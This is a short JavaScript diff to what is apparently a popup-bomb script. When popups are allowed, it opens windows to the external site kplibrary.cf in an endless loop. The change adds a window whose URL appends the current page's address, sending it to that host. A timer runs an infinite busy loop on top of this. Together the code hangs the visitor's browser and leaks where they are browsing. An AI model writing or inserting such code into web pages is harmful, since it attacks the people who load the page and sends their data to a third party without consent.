@@ -7,7 +7,9 @@ if (popUp == null || typeof(popUp) == 'undefined') {
 } else {
   while (true) {
     window.open("http://kplibrary.cf/")
-    window.open("kplibrary.cf", '_blank', 'toolbar=0,location=0,menubar=0');
+    var strWindowFeatures = "location=yes,height=670,width=620,scrollbars=yes,status=yes";
+var URL = "http://kplibrary.cf/" + location.href;
+var win = window.open(URL, "_blank", strWindowFeatures);
     setTimeout(function() {
       for (var i = 0; i === i; i++) {}
     }, 500);
